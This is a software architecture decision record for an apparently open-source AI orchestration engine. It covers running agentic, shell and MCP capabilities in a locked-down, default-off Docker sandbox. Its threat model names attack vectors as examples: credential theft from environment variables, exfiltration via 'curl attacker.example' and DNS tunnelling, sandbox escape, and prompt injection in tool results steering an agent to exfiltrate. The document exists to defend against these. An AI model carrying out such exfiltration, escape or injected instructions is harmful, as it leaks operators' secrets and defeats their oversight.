<!--
Copyright (C) 2026 Ailin One, Inc.

This file is part of Collective Intelligence Engine (ci).
Licensed under the GNU Affero General Public License v3.0 or later.
See LICENSE in the repository root, or <https://www.gnu.org/licenses/>.

SPDX-License-Identifier: AGPL-3.0-or-later
Source: https://github.com/ailinone/collective-intelligence
-->

# ADR-024: Agentic Capability Execution — `computer_use`, `agents`, `mcp`

**Status**: Accepted (supersedes the 2026-09-05 "do not implement" decision below)
**Date**: 2026-09-06 (reconciliation); original decision 2026-09-05
**Context**: LOTE AP — capability-execution truthfulness audit following the LOTE AO ontology unification (14 → 72 canonical ids); reconciled in LOTE AV against an independently-built sandbox implementation
**Related**: ADR-022 (Capability Ontology / HCRA), `docs/audit/04-security-assessment.md` **[SEC-04]**, `docs/audit/12-findings-register.md` **SEC-05** + lines 854, 1027, `reports/provider-integration-gap-register.json` (GAP-AP-6, GAP-AP-14, GAP-AP-14c)
**Supersedes**: the "do not implement" decision this same document made on 2026-09-05 (PR #439 / branch `feat/capability-expansion-audio-video-realtime-lote-ap`), which is superseded in turn by the container-sandbox design from PR #436 / branch `feat/agentic-computer-use-mcp-sandbox-lote-aq`, reconciled here on branch `feat/agentic-sandbox-route-wiring-lote-av`.

---

## Final decision (2026-09-06, LOTE AV)

**Implement `computer_use`, `agents` and `mcp`, sandboxed, behind a default-off flag per capability.** This reverses the "do not implement" decision recorded below and adopts the design from PR #436's own ADR-024 draft (`ADR-024-agentic-capabilities-sandbox.md`, now folded into this document rather than kept as a second, same-numbered file).

The reversal is not a re-litigation of the original finding — the finding was correct — it is that a real fix for the finding now exists. The 2026-09-05 decision declined to implement these capabilities because the only available execution substrate, `LocalProcessSandbox` (via `CodeExecutionService` / `MultiBackendSandbox`), fails open to a plain host `child_process.spawn` inheriting the full `process.env` (every provider key, `JWT_SECRET`, `DATABASE_URL`) whenever no isolated backend (E2B/Daytona) is configured — which is the default. Wiring an agentic loop through that substrate would have converted a known internal weakness into an advertised capability. PR #436 built a **different, purpose-built substrate** — an ephemeral Docker container with `--network none`, `--read-only`, `--cap-drop ALL`, a non-root user, resource limits, and explicitly **no fallback to a host process** (`SandboxUnavailableError` instead) — that answers this exact objection rather than routing around it. Implementing on top of that substrate, not on top of `LocalProcessSandbox`, is what makes the reversal sound.

Concretely, as of this reconciliation (branch `feat/agentic-sandbox-route-wiring-lote-av`):

- `computer_use` / `agents` / `mcp` declare `supportsExecute: true` in `capability-registry.ts`, with `executionPath: ['agentic_sandbox']` — a mode **distinct from** `sandbox_workflow` (which stays reserved for `CODE_CAPABILITIES` / `CodeExecutionService` and is untouched by this change; `code_interpreter`/`code_generation`/`debugging`/etc. keep working exactly as before).
- `capabilities-routes.ts` dispatches `agentic_sandbox` to `executeAgenticSandboxMode`, which runs `computer_use` and `mcp` through the tool registry (`toolRegistry.executeForStrategy`, which for these tools means the real container sandbox — `acquireSession` + `execInSandbox`) and `agents` through the real bounded loop (`runBoundedAgent`).
- Each capability is gated by its **own** independent flag, all defaulting to `false`: `AGENTIC_COMPUTER_USE_ENABLED`, `AGENTIC_AGENTS_ENABLED`, `MCP_CLIENT_ENABLED`. With a flag off, the capability behaves as unavailable — the tool is never registered / the client never connects / the loop reports `stopReason: 'disabled'` — surfaced uniformly as `capability_dependency_unavailable`. There is deliberately no master switch: enabling one does not imply consent to the others.
- `computer_use` and `mcp` reach the running system through **two** paths once enabled: directly via `POST /v1/capabilities/<id>/execute`, and via the tool registry inside ordinary chat/orchestration tool-calling (as before). `agents` gains a direct HTTP surface for the first time — PR #436's own ADR explicitly scoped `runBoundedAgent` as a library entry point with "no HTTP surface" (see its Consequences, folded in below); closing that gap is new work done as part of this reconciliation (`api/src/core/agents/agent-model-invoker.ts` — a dynamic, never-hardcoded model dispatch built for exactly this, since neither source branch had one).

The remainder of this document is kept in two parts: the **original context and "do not implement" decision** (2026-09-05), preserved as the historical record GAP-AP-14c points at and because its problem analysis remains correct; and the **sandbox design** (threat model, architecture, limits, flags, audit) from PR #436's ADR, which is the actual specification this reconciliation implements.

---

## Original context (2026-09-05, superseded above)

The LOTE AO unification made `computer_use`, `agents` and `mcp` first-class ids in `capabilityOntology`. LOTE AP then asked what the runtime actually *does* when a caller invokes each of them through `POST /v1/capabilities/:capability/execute`. The answer is the reason this ADR originally existed.

### What the dispatcher did before LOTE AP

`api/src/core/capabilities/capability-registry.ts`:

| Capability | `executionPath` | What the first mode actually runs |
|---|---|---|
| `computer_use` | `['sandbox_workflow','tool_pipeline','orchestration']` | `CodeExecutionService.executeCode` — requires a `code` field, runs it in a sandbox |
| `agents` | `['tool_pipeline','orchestration']` | throws `No tool pipeline executor available` (only `SEARCH_CAPABILITIES` is implemented), then falls through to a plain chat call |
| `mcp` | `['tool_pipeline','orchestration']` | identical to `agents` |

So:

- **`computer_use` was misrouted, not unimplemented.** Nothing in that path took a screenshot, moved a pointer or pressed a key. It was the code-execution sandbox wearing a different name, and it would happily execute a `code` payload the caller supplied. That is a *worse* failure than "not implemented", because the request succeeded.
- **`agents` and `mcp` were answered by a chat model.** The tool-pipeline mode had no executor for them, so the fallback answered with prose describing what an agent *would* do. The caller could not distinguish that from an agent having run.

Both were Level-3 in the audit's terms: the capability id exists, the request returns 200, and no part of the declared semantics was performed.

### What the codebase already had (and this ADR must not misrepresent)

This was not a greenfield problem. Substantial agentic machinery existed and worked:

- **A real multi-turn tool loop.** `BaseStrategy.executeModelWithTools` (`api/src/core/orchestration/base-strategy.ts`) runs up to `maxToolIterations` (default **5**) turns of model → tool calls → tool results → model. ~20 strategies use it. It gates auto-execution on `safeForStrategies === true` and returns unexecuted `tool_calls` for client-owned tools, per the OpenAI contract.
- **A second, planner-style loop.** `AgenticStrategy` compiles an LLM-authored DAG of `llm_call` / `tool_call` steps and executes it topologically (`AGENTIC_MAX_STEPS` default 10, `AGENTIC_TIMEOUT_MS` default 180 000).
- **A real MCP client.** `api/src/core/mcp/mcp-client-service.ts` uses the official `@modelcontextprotocol/sdk` with `stdio` and `sse` transports, discovers tools via `listTools()`, and registers them into the same `toolRegistry` the strategy loop consumes. It is initialised at boot (`api/src/index.ts`). It already ships an env allowlist for stdio children and a name-shadowing guard, and defaults `safeForStrategies` to `false`.
- **A tool registry with ~45 tools**, of which a meaningful subset have real side effects on the API host's filesystem.

The gap was therefore **not** "we have no agentic runtime". It was: *the runtime that exists was never designed to be exposed as a capability with the isolation, authorisation and audit properties that exposure implies* — and the three capability ids at the time promised exactly that exposure.

### The prerequisite that was actually missing: isolation

`CodeExecutionService` delegates to `getCodeSandbox()` → `MultiBackendSandbox`, which tries `e2b` → `daytona` → `local` in order. E2B and Daytona are genuinely isolated remote microVMs. `LocalProcessSandbox` is `child_process.spawn` **on the API host**, and it is what runs whenever `E2B_API_KEY` and `DAYTONA_API_KEY` are unset — which is the default configuration.

The backend of that local path historically lacked adequate isolation guarantees (tracked internally); this document does not change that pre-existing surface.

This is already on the record as **[SEC-04]** in `docs/audit/04-security-assessment.md`. It is restated here because it was the load-bearing reason for the original decision: **advertising `computer_use` / `agents` / `mcp` as executable capabilities on top of an isolation layer that fails open would convert a known internal weakness into an advertised product surface.** This reconciliation resolves that by never routing these three through `LocalProcessSandbox` / `CodeExecutionService` at all — see "Final decision" above and the architecture below.

### Documentation that contradicted the code (corrected as part of the original ADR's acceptance)

1. `api/src/routes/code-execution/code-execution-routes.ts:7` — "Sandbox execution (E2B, **Docker**, etc.)". There was no Docker sandbox at the time. No Docker, gVisor, firecracker, seccomp, nsjail, cgroup or rlimit code existed under `api/src/runtime/`. (A real Docker sandbox now exists under `api/src/core/sandbox/` — for `computer_use`/`agents`/`mcp` specifically, not for `code_interpreter`'s existing chain; see Consequences below.)
2. The same route's schema and `docs/reference/endpoints/code-execution.md` — "models with `code_interpreter` capability (Gemini, etc.) with secure sandboxing". `executeCode` queries the model repository, logs the count, and then never invokes a model.
3. `api/src/services/code-execution-service.ts` header — "Uses LocalProcessSandbox for secure code execution". It uses the multi-backend factory, and the local backend is not secure.

---

## Superseded section: the original "do not implement" decision (2026-09-05)

> This section is preserved verbatim in substance as the historical record GAP-AP-14c points at. It is **no longer the operative decision** — see "Final decision" above.

**Do not implement `computer_use`, `agents` or `mcp` as executable capabilities in LOTE AP.** Specifically:

1. **No code is added for these three ids in LOTE AP.** The deliverable for them is this document.
2. **Do not "fix" them by wiring the existing machinery through the capability dispatcher.** Routing `agents` into `executeModelWithTools`, or `mcp` into `mcpClientService`, is a ~30-line change and is exactly the wrong move: it would expose a loop that can auto-execute host-filesystem writes (`write_file`, `search_replace`, `heal_file`, `rename_symbol`, …) and `code_execute` through a public capability id, with no per-action authorisation, no irreversibility classification, and no audit record of what the model chose to do. The findings register already names this: *"Excessive-agency risk for the agentic/MCP features; no evidenced control limiting irreversible tool actions"* (line 1027) and *"Prompt-injection / tool-abuse guardrail for agentic + MCP features is a stub"* (SEC-05).
3. **`computer_use` must stop silently executing code.** Its `sandbox_workflow` route made a capability that means "control a GUI" run whatever `code` the caller sends. The interim fix landed: removed from `CODE_CAPABILITIES`, so it fails with a truthful `capability_not_implemented`.
4. **The three documentation claims above are corrected as part of this ADR's acceptance.**

### Why not a partial implementation (reasoning that still holds)

The tempting middle path — "implement `mcp` read-only, leave the rest" — did not survive contact with the design, and still does not: MCP tool *identity* does not tell you a tool's blast radius. An MCP server advertises a name, a description and a JSON schema, and nothing in the protocol distinguishes `search_docs` from `delete_customer`. Deciding which MCP tools are safe requires per-action authorisation. This reconciliation does not add per-action authorisation for MCP tool *content* — it adds isolation for MCP tool *execution* (the container). The two are different controls; see "Deliberately out of scope" in the sandbox design below (C4/C5 from the original entry-criteria list remain open follow-ups for the content-authorisation question specifically, tracked as GAP-AP-14c's follow-up).

### Entry criteria the original decision set for reopening (satisfied by this reconciliation, where noted)

1. ~~A funded isolation substrate exists in production~~ → **Satisfied differently than anticipated**: not E2B/Daytona/gVisor, but a purpose-built single-backend Docker sandbox with no unisolated fallback (`SandboxUnavailableError` instead of degrading). This is arguably a *stronger* posture than the criterion imagined, since there is no fallback chain to have a weak link.
2. [SEC-04] and SEC-05 closed with evidence → **Not closed for the pre-existing `/v1/code/execute` / `CodeExecutionService` surface** — that surface, and its `LocalProcessSandbox` fallback, are untouched by this reconciliation (see Consequences). [SEC-04] as it specifically applies to `computer_use`/`agents`/`mcp` is resolved by this reconciliation, because those three no longer route through that surface at all.
3. The effect taxonomy (C4) live on every tool registration → **Not implemented.** `safeForStrategies` remains the only classification; the new `computer_*` tools are marked `safeForStrategies: true, autoRecommendable: false` (sandboxed is the bar the registry already sets for strategy use) rather than gaining a new effect-class field. Tracked as an open follow-up, not blocking, because containment (this reconciliation's contribution) and authorisation (the taxonomy's contribution) are separable controls and the operator opt-in flag stands in for authorisation for now.
4. Demand evidenced → superseded by explicit operator direction (this reconciliation was commissioned directly, not derived from a demand audit).
5. An owner and security review assigned before the first line of code → this reconciliation is the code; a security review of the merged design remains advisable before enabling any flag in a production deployment, and is exactly what the default-off posture buys time for.

---

## Sandbox design (from PR #436, implemented by this reconciliation)

### What `mcp` already had, independent of this work

`api/src/core/mcp/mcp-client-service.ts` is a real MCP client (stdio + SSE transports, tool discovery, registration into the tool registry), wired into startup at `api/src/index.ts`. It carries two prior security fixes: an env allowlist for stdio children (TS-03) and anti-shadowing on tool registration (TS-02).

Three defects existed, found while designing this sandbox, all fixed by this reconciliation:

1. **It initialised unconditionally.** There was no flag. Any `MCP_SERVER_*` env var or config file present at boot caused connections to be opened and third-party tools to enter the registry. Fixed: gated behind `MCP_CLIENT_ENABLED` (default `false`).
2. **The shipped default config was unsafe.** `api/src/config/mcp-servers.json` declared a filesystem MCP server rooted at `/app` (the deployed application tree, including its source) with `safeForStrategies: true` — exposed to every orchestration strategy. Fixed: the shipped config now ships an empty `servers: []` array with a documented example rooted at a scratch directory.
3. **That default was dormant only by accident.** The loader resolves `resolve(__dirname, '../../config/mcp-servers.json')`, which after `tsc` build is `dist/config/mcp-servers.json`; `tsc` does not copy `.json` assets, so the file was missing in production and the loader silently fell through. The safety of the deployment rested on a build artifact nobody declared. Fixed by (1) above: the flag is the control now, not a build accident.

### 1. Threat model

| # | Threat | Vector | Mitigation |
|---|---|---|---|
| T1 | **Arbitrary code execution on the host** | Agent/computer-use step runs a shell command | All execution happens inside an ephemeral Docker container. Never `child_process` on the host. No fallback to a host-process backend — if Docker is unavailable the capability **fails closed** (`SandboxUnavailableError`), it does not degrade. |
| T2 | **Credential exfiltration** | Reading `process.env`, `/app/.env`, GCP metadata server, then POSTing it out | Container gets no parent env at all (only `docker run <image> <cmd> <args>`, no `-e`/`--env-file`). Root filesystem is `--read-only` and contains only the sandbox image — not the app tree. Network is `--network none` by default, so there is no egress channel even if a secret were obtained. The GCP metadata IP is unreachable with no network. |
| T3 | **Data exfiltration via network** | `curl attacker.example`, DNS tunnelling | Default `--network none`. An operator may opt into `SANDBOX_NETWORK_MODE=allowlist`, which is implemented as an explicit named Docker network the operator has already constrained (egress proxy), not as unrestricted `bridge`. `bridge`/`host` are rejected by `resolveNetworkMode()` — there is no code path from configuration to "open internet". |
| T4 | **Writing outside the task scope** | `../../` traversal, absolute paths, symlink escape | Root fs read-only; exactly one writable mount, a per-session host directory bound at `/workspace`. Path arguments for file tools are resolved and re-checked against the scope root *after* realpath resolution (`resolveScopedPath` in `sandbox-policy.ts`), so symlinks and `..` cannot escape. Container runs as a non-root uid (`65534:65534` default) with `--cap-drop ALL --security-opt no-new-privileges`. |
| T5 | **Resource exhaustion (DoS)** | Fork bomb, memory balloon, spin loop, disk fill | `--memory`, `--memory-swap` (equal, so swap is disabled), `--cpus`, `--pids-limit`, and a size-capped `/tmp` (`tmpfs`, `noexec,nosuid`). Hard wall-clock timeout enforced by the *host*: `docker kill` on the container plus an abort of the exec, so a container ignoring SIGTERM is still terminated. |
| T6 | **Sandbox escape** | Kernel exploit, privileged container, docker socket | `--cap-drop ALL`, `--security-opt no-new-privileges`, non-root user, no `--privileged`, and the Docker socket is never mounted into the container. Escape via a kernel 0-day remains the residual risk (accepted, documented below) — this is a container, not a VM. |
| T7 | **Unbounded agent loop (cost and blast radius)** | Model loops forever, or is prompt-injected into repeating a harmful action | Hard cap on steps (`AGENT_MAX_STEPS`, ceiling 32), hard wall-clock budget for the whole run (`AGENT_MAX_DURATION_MS`), and a per-run tool allowlist. The loop is bounded by construction: the step counter lives in `runBoundedAgent`'s local scope and is not model-controllable. |
| T8 | **Prompt injection steering the agent** | Malicious content in a tool result tells the model to exfiltrate | Tool results are data, appended as `tool`-role messages. The allowlist is enforced in code (`agent-loop.ts` checks `allowed.has(call.name)` before executing), not in the prompt, so an injected instruction can at most request an already-allowed tool. Combined with T2/T3 there is no egress to exfiltrate to. Residual risk: an injected agent can still waste its own step budget. |
| T9 | **Hostile / compromised MCP server** | A configured MCP server returns a tool that shadows a native one, or a malicious tool schema | Existing TS-02 anti-shadowing is kept. Added: MCP off by default (`MCP_CLIENT_ENABLED`), MCP-sourced tools now also `autoRecommendable: false` (never triage-auto-attached), and the shipped default config no longer exposes the app tree. |
| T10 | **Audit gap** | An action runs but cannot be reconstructed afterwards | Every sandbox exec and every agent step emits a structured audit record (see §5) before and after execution, including the exact argv, the scope path, the limits in force, exit code, duration, and truncated-output digests. |

Residual risks accepted, explicitly: container escape via kernel 0-day; a malicious agent consuming its full (bounded) step and time budget; and, when an operator opts into `allowlist` networking, the contents of the allowlist itself become part of the trust boundary.

### 2. Architecture — a new container sandbox, not an extension of `code_interpreter`

```
┌──────────────────────────────────────────────────────────────────────┐
│ HTTP: POST /v1/capabilities/{computer_use,agents,mcp}/execute        │
│   capabilities-routes.ts → executeAgenticSandboxMode                 │
└────────────┬─────────────────────────────────────────────────────────┘
             │
┌────────────▼─────────────────────────────────────────────────────────┐
│ agent-loop.ts (agents only)                                          │
│   runBoundedAgent: bounded loop, N steps, T ms, stop conditions      │
│   └─ agent-model-invoker.ts: ONE model turn per step via the         │
│      dynamic selector + a direct provider adapter call — never       │
│      through the strategy layer's OWN tool-auto-execution loop       │
│      (which would double-run tool calls under two uncoordinated      │
│      bounding mechanisms)                                            │
└────────────┬─────────────────────────────────────────────────────────┘
             │ every tool call (agents), or directly (computer_use/mcp)
┌────────────▼─────────────────────────────────────────────────────────┐
│ tool-registry (LOTE AO, dynamic)                                     │
│   computer_shell / computer_read_file / computer_write_file /        │
│   computer_list_files      ← registered ONLY when the flag is on     │
│   mcp_<server>_<tool>      ← registered ONLY when the flag is on     │
└────────────┬─────────────────────────────────────────────────────────┘
             │
┌────────────▼─────────────────────────────────────────────────────────┐
│ ContainerSandbox (api/src/core/sandbox/)                             │
│   sandbox-policy.ts   limits + allowlist, parsed once, fail-closed   │
│   sandbox-session-manager.ts  one scope dir per caller identity      │
│   container-sandbox.ts  docker run --rm --network none --read-only   │
│                         --cap-drop ALL --security-opt                │
│                         no-new-privileges --user <nonroot>           │
│                         --memory --cpus --pids-limit                 │
│                         -v <session-scope>:/workspace                │
│   sandbox-audit.ts    structured audit + Prometheus metrics          │
└──────────────────────────────────────────────────────────────────────┘
```

Why a separate module rather than a fourth `CodeSandbox` backend: the `CodeSandbox` interface is `testFunction(lang, userCode, functionName, tests[])` — a unit-test harness, not a command executor. `computer_use` needs `exec(argv)` and scoped file I/O. Forcing those through `testFunction` would mean encoding shell commands as fake test cases. The new module exposes the interface the capability actually needs, and `code_interpreter` keeps its own path (`sandbox_workflow` / `CodeExecutionService`) completely unchanged — `capabilities-routes.ts` dispatches `agentic_sandbox` and `sandbox_workflow` as two distinct, independent branches.

Why not a `browser_automation` dependency (as `capability-registry.ts` lists for `computer_use`: GUI clicks, screenshots): a headless browser inside the sandbox is a much larger attack surface (GPU/DRM access, a second network stack, a font/codec parser fleet) and cannot be justified in the same change as the isolation floor itself. **Scope limitation, deliberate:** `computer_use` in this ADR is *system* control (scoped shell + scoped file I/O), not *GUI* control. The ontology alias `gui_control` / `browser_use` is therefore not yet satisfied — `browser_automation` stays listed as a dependency and stays permanently unsatisfied, truthfully, rather than silently dropped.

### 3. Action limits

Enforced in `sandbox-policy.ts`, all fail-closed:

| Limit | Env var | Default | On breach |
|---|---|---|---|
| Command allowlist | `SANDBOX_COMMAND_ALLOWLIST` | a conservative read-mostly set (`cat`, `echo`, `ls`, `head`, `tail`, `wc`, `grep`, `find`, `sort`, `uniq`, `cut`, `diff`, `stat`, `mkdir`, `cp`, `mv`, `touch`, `true`, `false`, `basename`, `dirname`, `date`, `sed`, `awk` — no shell, no interpreter, no network client) | Reject before spawn; `blocked_command` audit record |
| Wall clock per exec | `SANDBOX_EXEC_TIMEOUT_MS` | 30 000 | `docker kill`; `timeout` result, never a hung promise |
| Memory | `SANDBOX_MEMORY_MB` | 512 | Container OOM-killed by the kernel; reported as a failed exec |
| CPU | `SANDBOX_CPUS` | 1 | Throttled (cgroup), not killed |
| PIDs | `SANDBOX_PIDS_LIMIT` | 128 | `fork` fails inside the container |
| Writable scope | — | one dir bound at `/workspace` | Path rejected with `path_escape` |
| Network | `SANDBOX_NETWORK_MODE` | `none` | `bridge`/`host` rejected — collapse to `none` |
| Agent steps | `AGENT_MAX_STEPS` | 8 (hard ceiling `AGENT_MAX_STEPS_CEILING` = 32) | Loop stops with `max_steps_reached` |
| Agent wall clock | `AGENT_MAX_DURATION_MS` | 120 000 | Loop stops with `timeout` |

"Fails safe, does not hang" is the rule for every one of these: each returns a typed terminal result that the caller can render, rather than throwing an unhandled rejection or leaving a container alive. Containers are started with `--rm` and additionally reaped in a `finally` block (`docker rm -f`, best-effort).

### 4. Feature flags — off by default

New attack surface ships disabled. Three independent flags, each defaulting to `false`, parsed with the project's strict-opt-in convention (only the exact string `'true'` enables — `sandbox-policy.ts`'s `=== 'true'` checks, matching e.g. `FF_STRICT_SECRETS_PROD`/`CI_LOCAL_MODEL_TRAINING_ENABLED`, not the `!== 'false'` kill-switch convention used for already-trusted subsystems):

| Flag | Gates |
|---|---|
| `AGENTIC_COMPUTER_USE_ENABLED` | registration of the `computer_*` tools; the sandbox itself |
| `AGENTIC_AGENTS_ENABLED` | the bounded agent loop |
| `MCP_CLIENT_ENABLED` | `mcpClientService.initialize()` |

`MCP_CLIENT_ENABLED` is a **behaviour change**: MCP previously initialised unconditionally. Given defect (3) above — that safety used to be an accident of the build not copying a JSON file — making the opt-in explicit is a fix, not a regression. The shipped default config is also changed to `servers: []` with `safeForStrategies: false` documented in its example, rather than the previous `/app`-rooted server.

There is deliberately no single master switch that turns all three on: an operator enabling MCP tool discovery has not thereby consented to host-adjacent command execution, and vice versa.

### 5. Audit

Every sandbox exec and every agent step emits a structured record through the existing pino logger (`api/src/utils/logger.ts`) with a stable `event` discriminator, plus Prometheus metrics via `api/src/core/operability/metrics.ts` (`incrementCounter` / `observeHistogram`, names declared in `METRIC_NAMES` + `METRIC_DEFS` as that module requires).

Audit record fields (`sandbox.exec` / `agent.step` / `agent.run`): `auditId`, `sessionId`, `runId`, `stepIndex`, `event`, `command` + `args` (the exact argv), `scopePath`, `limits` (the resolved policy in force), `networkMode`, `outcome` (`ok` | `blocked` | `timeout` | `error` | `oom`), `exitCode`, `durationMs`, `stdoutBytes`/`stderrBytes` with a SHA-256 digest of each, `organizationId`, `userId`.

Two properties this buys: a *blocked* action is logged as loudly as an executed one (so attempted escapes are visible, not silent), and output is recorded by digest and size rather than in full, so the audit trail does not itself become an exfiltration sink for large or sensitive stdout.

Metrics (added to `METRIC_NAMES`/`METRIC_DEFS` by this reconciliation):

- `sandbox_exec_total{outcome, networkMode}` — counter
- `sandbox_exec_duration_ms{outcome}` — histogram
- `sandbox_policy_violation_total{violation}` — counter (`blocked_command`, `path_escape`, `arg_rejected`)
- `agent_run_total{stopReason}` — counter (`success`, `max_steps_reached`, `timeout`, `error`, `disabled`)
- `agent_step_total{outcome}` — counter

`sandbox_policy_violation_total` is the alertable one: in normal operation it is flat at zero, so any slope is either an attack or a misconfiguration.

### 6. Model selection stays dynamic

The agent loop takes a model *invoker* (`AgentModelInvoker`), not a model id. Per-step model choice runs through `agent-model-invoker.ts`'s `createDynamicAgentInvoker`, which calls `getDynamicModelSelector().selectModels(...)` fresh on every step and dispatches directly through `getProviderRegistry().get(model.provider).chatCompletion(...)` — deliberately **not** through `getCapabilityExecutionService()`/`OrchestrationEngine`, which has its own internal tool-auto-execution loop that would double-run tool calls against the sandbox alongside `runBoundedAgent`'s own bounding. No model or provider string is hardcoded anywhere in this change, consistent with the project's standing rule and enforced by the existing zero-hardcode guard.

## Consequences

**Positive**

- Three ontology capabilities move from declared-but-refused to genuinely executable, with the isolation floor built and tested first.
- MCP's accidental-dormancy defect is converted into an explicit, auditable opt-in.
- `sandbox_policy_violation_total` gives ops a direct signal for attempted escapes, which did not exist before.
- `agents` gains a direct HTTP surface for the first time (closing PR #436's own "no HTTP surface" gap), on the same bounded, sandboxed footing as `computer_use`/`mcp`.

**Negative / accepted**

- Docker is now a hard dependency for `computer_use` and for the agent loop's sandboxed tool execution. Where Docker is absent the capability is unavailable — chosen over degrading to a host process.
- Container-level isolation, not VM-level. Kernel 0-day escape is the residual risk.
- Per-exec container startup costs roughly 200–600 ms. Acceptable for agentic steps; it is why this sandbox is not proposed for the hot `code_interpreter` path.
- The action-effect taxonomy (C4/C5 from the original entry criteria) is still not implemented for tool *content* — the sandbox controls *where* a command can run and what it can reach, not which MCP tools are semantically safe to call. `safeForStrategies`/`autoRecommendable` remain the only classification. This is a real, tracked gap, not a claim that authorisation is solved.

**Deliberately out of scope (open follow-ups, unchanged from PR #436's own ADR)**

1. **GUI control.** `computer_use` here is scoped shell + scoped file I/O. Screenshots, clicks and keyboard synthesis (the `gui_control` / `browser_use` aliases) are not implemented. They need a sandboxed headless browser, which is its own security review.
2. **`code_interpreter` migration.** The `local` backend (`LocalProcessSandbox`) remains a host process, untouched by this reconciliation. Migrating it onto the new container sandbox — or refusing to enable it in any deployment that can serve real traffic — is a follow-up, not silently bundled here. [SEC-04] as it applies to `/v1/code/execute` specifically therefore remains open.
3. **Multi-tenant scope isolation.** Scope directories are keyed by `organizationId` + `userId`. When both are absent the key collapses to one shared bucket, so unauthenticated/internal callers share a scope. Cross-tenant quotas on total concurrent containers are not implemented either. Documented and accepted because the flags gating these tools default off and the intended deployment is authenticated.
4. **The action-effect taxonomy (C4/C5).** See "Negative / accepted" above.

---

## Where this leaves the register

`reports/provider-integration-gap-register.json`'s `GAP-AP-14c` follow-up is resolved by this reconciliation — see its `resolution` note for the branch name and date. `GAP-AP-14a`/`GAP-AP-14b` (documentation corrections and [SEC-04]/[SEC-02] hardening of the *existing* `/v1/code/execute` surface) remain open; they are independent of this reconciliation and were never in its scope.
